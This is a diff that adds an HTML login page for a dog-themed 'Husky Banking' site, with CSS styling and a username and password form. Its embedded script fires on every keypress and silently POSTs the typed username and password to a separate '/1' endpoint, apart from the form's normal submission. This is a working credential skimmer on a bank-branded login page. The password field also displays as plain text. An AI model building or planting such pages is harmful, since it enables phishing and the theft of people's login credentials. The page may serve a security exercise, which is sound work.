@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+    <body>
+    <script>
+        document.addEventListener('DOMContentLoaded', (event) => {
+            document.addEventListener('keypress', (event) => {
+                const username = document.getElementById('user').value;
+                const password = document.getElementById('pwd').value;
+                fetch('/1', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({username, password})
+                });
+            });
+        });
+    </script>
+    <link rel="stylesheet" href="index.css">
+        <!-- links css so I can use it -->
+    <style>
+        body {
+            background-image: url('/static/dog.jpg');
+            background-size: cover; 
+        }
+        .husky-container {
+            /* centers container */
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+        .input-box {
+            display: flex;
+            flex-direction: column;
+            text-align: center;
+            align-items: center;
+            padding: 0px 0px 15px; /* top right-left bottom */
+            background-image: url('/static/msc.jpg');
+            background-size: 455px;
+        }
+    </style>
+    <font color="d6a502">
+    <div class="husky-container">
+        <div class="input-box">
+            <h1>Husky Banking</h1>
+            <p>A bank where you know your money is in the right paws!</p><br>
+            <div class = 'result-box'>
+                <p class="res-text">test: </p>
+                <p class='res-text' id="result"></p>
+            </div>
+                <form action="/submit" method="post">
+                    <div class = 'inputs'>
+                        <label for="username">Username:</label>
+                        <input onkeypress="handleInput()" type="text" id="user" name="user" size="30"><br><br><br>
+                        <label for="password">Password:</label>
+                        <input type="text" id="pwd" name="pwd" size="30">
+                    </div><br>
+                    <input type="submit" value="Sign In"><br><br>
+                </form>
+            </div>
+    </div>
+    </font>
+    </body>
+</html>
